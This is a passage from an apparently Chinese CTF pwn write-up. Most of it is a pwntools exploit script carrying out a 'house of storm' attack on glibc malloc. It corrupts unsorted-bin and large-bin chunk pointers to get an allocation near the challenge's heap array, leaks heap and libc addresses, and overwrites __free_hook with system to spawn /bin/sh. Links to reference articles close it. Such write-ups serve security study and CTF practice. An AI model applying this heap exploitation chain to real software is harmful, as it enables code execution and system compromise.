	add(0x18)#6  
	
	#----------------准备 unsorted chunk-----------------------#
	edit(1,'\x00'*0x4F0+p64(0x500)) 
	free(1)
	edit(0,'\x00'*(0x18-12))  
	add(0x18) #1 
	add(0x4d8) #7  
	
	free(1)   
	free(2) #1-2 合并  
	
	add(0x38)#1
	add(0x4e8)#2   
	
	#-------------------准备 large chunk-----------------------------------#
	edit(4,'\x00'*0x4F0+p64(0x500))#伪造chunk
	free(4)
	edit(3,'\x00'*(0x18-12)) 
	add(0x18) #4
	add(0x4d8) #8  
	
	free(4)
	free(5) #4-5 
	
	add(0x48)#4  
	#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
	free(2)
	add(0x4e8) 
	free(2)   
	#--------------修改他们是的满足条件进行 house of strom------------------------------#
	fake_chunk = 0x13370800 - 0x20
	payload = '\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
	edit(7, payload) #修改unsorted chunk的bk
	
	payload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
	edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsize
	add(0x48)  #2  -> 0x133707e0   成功将申请到了heaparray附近
	
	 
	
	#-----------------------泄漏 libc----------------------------------#
	#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址
	
	payload = p64(0)*6 + p64(0x13370800)
	edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0
	
	#dbg()
	 
	payload = p64(0)*3 +p64(0x13377331)  #满足show的条件
	
	payload += p64(0x13370800) + p64(0x1000) #chunk0
	payload += p64(fake_chunk+3) + p64(8)   #chunk1
	edit(0, payload) #满足show的条件
	
	#dbg()
	
	show(1)  #我们刚刚house of storm 写的地址泄漏出来
	ru("]: ")
	heap = u64(r(6).ljust(8, '\x00'))
	success("heap:"+hex(heap))
	
	#dbg()
	
	payload  = p64(0)*3 + p64(0x13377331)#满足show的条件
	payload += p64(0x13370800) + p64(0x1000) #chunk0
	payload += p64(heap+0x10) + p64(8) #chunk1
	edit(0, payload)
	
	#dbg()
	
	show(1) #泄漏libc地址
	ru("]: ")
	malloc_hook = u64(r(6).ljust(8, '\x00')) -0x58 - 0x10
	libc_base = malloc_hook - libc.sym['__malloc_hook']
	free_hook = libc_base+libc.sym['__free_hook']
	system = libc_base+ libc.sym['system']
	success("free_hook:"+hex(free_hook))
	 
	#--------------修改 free_hook -----------------------------------#
	payload  = p64(0)*4
	payload += p64(free_hook) + p64(0x100)#chunk0
	payload += p64(0x13370800+0x40) + p64(8)#chunk1
	payload += '/bin/sh\x00'
	edit(0, payload)
	#dbg()
	edit(0, p64(system))
	free(1)
	
	itr()

 >参考文章
 [House of storm 原理及利用](https://www.anquanke.com/post/id/203096)
 [Largebin Attack](https://www.freebuf.com/articles/system/209096.html)
 [CTF-WIKI](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/)
 [Largebin attack总结](https://bbs.pediy.com/thread-262424.htm#msg_header_h1_2)

